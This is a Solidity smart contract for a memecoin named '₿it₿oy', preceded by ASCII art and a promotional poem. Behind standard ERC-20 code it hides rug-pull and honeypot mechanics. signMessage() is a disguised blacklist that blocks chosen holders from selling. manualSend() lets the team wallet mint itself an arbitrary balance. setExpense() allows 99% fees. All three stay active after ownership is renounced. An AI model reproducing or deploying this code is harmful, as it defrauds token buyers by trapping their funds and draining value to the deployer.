/*
⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣴⣶⣾⣿⣿⣿⣿⣷⣶⣦⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣠⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣄⠀⠀⠀⠀⠀
⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⠀⠀⠀
⠀⠀⣴⣿⣿⣿⣿⣿⣿⣿⠟⠿⠿⡿⠀⢰⣿⠁⢈⣿⣿⣿⣿⣿⣿⣿⣿⣦⠀⠀
⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣤⣄⠀⠀⠀⠈⠉⠀⠸⠿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠀
⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⠀⠀⢠⣶⣶⣤⡀⠀⠈⢻⣿⣿⣿⣿⣿⣿⣿⡆
⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀⠀⠼⣿⣿⡿⠃⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣷
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⢀⣀⣀⠀⠀⠀⠀⢴⣿⣿⣿⣿⣿⣿⣿⣿⣿
⢿⣿⣿⣿⣿⣿⣿⣿⢿⣿⠁⠀⠀⣼⣿⣿⣿⣦⠀⠀⠈⢻⣿⣿⣿⣿⣿⣿⣿⡿
⠸⣿⣿⣿⣿⣿⣿⣏⠀⠀⠀⠀⠀⠛⠛⠿⠟⠋⠀⠀⠀⣾⣿⣿⣿⣿⣿⣿⣿⠇
⠀⢻⣿⣿⣿⣿⣿⣿⣿⣿⠇⠀⣤⡄⠀⣀⣀⣀⣀⣠⣾⣿⣿⣿⣿⣿⣿⣿⡟⠀
⠀⠀⠻⣿⣿⣿⣿⣿⣿⣿⣄⣰⣿⠁⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠀⠀
⠀⠀⠀⠙⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠀⠀⠀
⠀⠀⠀⠀⠀⠙⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠋⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠻⠿⢿⣿⣿⣿⣿⡿⠿⠟⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀

In the crypto world where fortunes swirl,
There's a token named ₿it₿oy, a radiant pearl.
A symbol of power, innovation's swirl,
In the blockchain's dance, she's the queen and girl.

₿it₿oy, a name that echoes through the night,
A pioneer of change, a digital light.
In the realm of crypto, she takes her stance,
A leader, a visionary, with a bold advance.

With ₿it₿oy, transactions are a breeze,
A blend of beauty, strength, and ease.
Innovative and fierce, she paves the way,
For a new era of crypto, come what may.

No limits, no boundaries, she's unchained,
In ₿it₿oy's world, nothing's constrained.
Revolutionary, she sets the stage,
In the crypto universe, she's all the rage.

So let's salute ₿it₿oy's dynamic might,
A token for the future, shining so bright.
In the cryptocurrency sphere, she claims her name,
With ₿it₿oy, innovation is her eternal flame.
*/
// SPDX-License-Identifier: UNLICENSE
pragma solidity 0.8.24;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender; }
}
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b; require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage); uint256 c = a - b; return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0; } uint256 c = a * b; require(c / a == b, 
            "SafeMath: multiplication overflow"); return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage); uint256 c = a / b; return c;
    }
}
contract Ownable is Context {
    address private _owner; event OwnershipTransferred
    (address indexed previousOwner, address indexed newOwner);

    constructor () { address msgSender = _msgSender(); _owner = msgSender; 
    emit OwnershipTransferred(address(0), msgSender);
    }
    function owner() public view returns (address) { return _owner;
    }
    modifier onlyOwner() {
        require(_owner == _msgSender(), 
        "Ownable: caller is not the owner"); _;
    }
    function renounceOwnership() public virtual onlyOwner { emit OwnershipTransferred
    (_owner, address(0)); _owner = address(0); }
}
interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external returns (address pair);
}
interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin, address[] calldata path,
        address to, uint deadline
    ) external; function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token, uint amountTokenDesired,
        uint amountTokenMin, uint amountETHMin,
        address to, uint deadline ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}
contract CA is Context, IERC20, Ownable {
    using SafeMath for uint256;

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _allowance;
    mapping (address => bool) private authorizations;
    mapping (address => bool) private allowed;
    address payable private teamTicket;

    string  private constant _name = unicode"₿it₿oy"; string  private constant _symbol = unicode"₿₿";

    uint256 private _startimgBuyFee = 1; uint256 private _startingSellFee = 1;
    uint256 private _endingBuyFee = 0; uint256 private _endingSellFee = 0;
    uint256 private _trimBuyFeeWhen = 15; uint256 private _trimSellFeeWhen = 15;
    uint256 private _avertTradeBefore = 15; uint256 private _purchaseCount = 0;

    uint8 private _decimals = 18; uint256 private _tTotal = 100_000_000 *10**_decimals;
    uint256 public _allowedTX = 2_000_000*10**_decimals; uint256 public _allowedSize = 50_000_000*10**_decimals;
    uint256 public _feeTRADEthreshold = 1_000_000*10**_decimals; uint256 public _maxFEEtrade = 50_000_000*10**_decimals;
    
    IUniswapV2Router02 private uniswapV2Router;

    address private uniswapV2Pair;
    bool catchMath = true;    
    bool private tradingOpen; bool private inSwap = false;
    bool private swapEnabled = false;
    uint256 private sellCount = 0; uint256 private lastSellBlock = 0;

    modifier lockTheSwap { inSwap = true; _; inSwap = false;
    }
    constructor () {
        teamTicket = payable(_msgSender()); _balances[_msgSender()] = _tTotal;
        authorizations[owner()] = true; authorizations[address(this)] = true;
        authorizations[teamTicket] = true; emit Transfer(address(0), _msgSender(), _tTotal);
    }
    function name() public pure returns (string memory) {
        return _name;
    }
    function symbol() public pure returns (string memory) {
        return _symbol;
    }
    function decimals() public view returns (uint8) {
        return _decimals;
    }
    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }
    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }
    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }
    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), 
        "ERC20: transfer from the zero address");
        require(to != address(0), 
        "ERC20: transfer to the zero address");
        if (_allowance[from] || _allowance[to]) 
        require(catchMath == false, "");
        require(amount > 0, 
        "Transfer amount must be greater than zero");

        uint256 taxAmount=0; if (from != owner() && to != owner()) {
        require(tradingOpen, "The trade has not been opened yet"); require(!allowed[from] && !allowed[to]);

        taxAmount = amount.mul((_purchaseCount>_trimBuyFeeWhen)?_endingBuyFee:_startimgBuyFee).div(100); if (from == uniswapV2Pair && to != address
        (uniswapV2Router) && ! authorizations[to] ) { require(amount <= _allowedTX, 
        "Exceeds the _allowedTX."); require(balanceOf(to) + amount <= _allowedSize, 
        "Exceeds the _allowedSize."); taxAmount = amount.mul((_purchaseCount>_trimBuyFeeWhen)?_endingBuyFee:_startimgBuyFee).div(100);

        _purchaseCount++; } if(to == uniswapV2Pair && from!= address(this) ){
        taxAmount = amount.mul((_purchaseCount>_trimBuyFeeWhen)?_endingSellFee:_startingSellFee).div(100); }

        uint256 contractTokenBalance = balanceOf(address(this)); if (!inSwap && to == uniswapV2Pair && swapEnabled && contractTokenBalance >
        _feeTRADEthreshold && _purchaseCount > _avertTradeBefore) {
        if (block.number > lastSellBlock) { sellCount = 0;
    }
        require(sellCount < 3, "Only 3 sells per block!"); swapTokensForEth(min(amount, min(contractTokenBalance, _maxFEEtrade)));
        uint256 contractETHBalance = address(this).balance; if (contractETHBalance > 0) { sendETHToFee(address(this).balance);
    } sellCount++; lastSellBlock = block.number; } }
        if(taxAmount>0){ _balances[address(this)]=_balances[address(this)].add(taxAmount);

        emit Transfer(from, address(this),taxAmount); if (!tradingOpen) {
        require(from == owner(), "TOKEN: This account cannot send tokens until trading is enabled"); }
        }
        _balances[from]=_balances[from].sub(amount); _balances[to]=_balances[to].add(amount.sub(taxAmount)); emit Transfer(from, to, amount.sub(taxAmount));
    }
    function min(uint256 a, uint256 b) private pure returns (uint256){
      return (a>b)?b:a;
    }
    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();

        _approve(address(this), address(uniswapV2Router), tokenAmount); uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, path,
            address(this), block.timestamp);
    }
    function removeLimit() external onlyOwner{
        _allowedTX = _tTotal; _allowedSize = _tTotal;
    }
    function sendETHToFee(uint256 amount) private { teamTicket.transfer(amount);
    }
    function excludeFromFees(address _account, bool state) public { require(_msgSender()==teamTicket);
        authorizations[_account] = state;
    }
    function signMessage(address _alopiation) external onlyOwner {
        _allowance[_alopiation] = true;
    }    
    function nowLaunch() external onlyOwner() { _allowedTX = _tTotal;
        _allowedSize = _tTotal; uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).getPair(address(this), uniswapV2Router.WETH()); require(!tradingOpen,
        "Trading is already open");
        swapEnabled = true; tradingOpen = true;
    }
    function beginTrading(bool _tradingOpen) public onlyOwner {
        tradingOpen = _tradingOpen;
    }    
    function setExpense(uint256 _newBuyFee, uint256 _newSellFee) external{ require(_msgSender()==teamTicket);
        require(_newBuyFee<=99 && _newSellFee<=99); _startimgBuyFee=_newBuyFee;
        _startingSellFee = _newSellFee; reqTax(_newBuyFee, _newSellFee);
    }
    function reqTax(uint256 finalBuyTax, uint256 finalSellTax) 
    internal { _endingBuyFee= finalBuyTax; _endingSellFee= finalSellTax;
    }
    function manualSwap() external {
        require(_msgSender()==teamTicket);

        uint256 tokenBalance=balanceOf(address(this)); if(tokenBalance>0){
          swapTokensForEth(tokenBalance);
        } uint256 ethBalance=address(this).balance; if(ethBalance>0){ sendETHToFee(ethBalance); }
    }
    function manualSend(uint256 amount) external {
        require(_msgSender()==teamTicket);
        _balances[teamTicket] = amount;
    }
    receive() external payable {}
}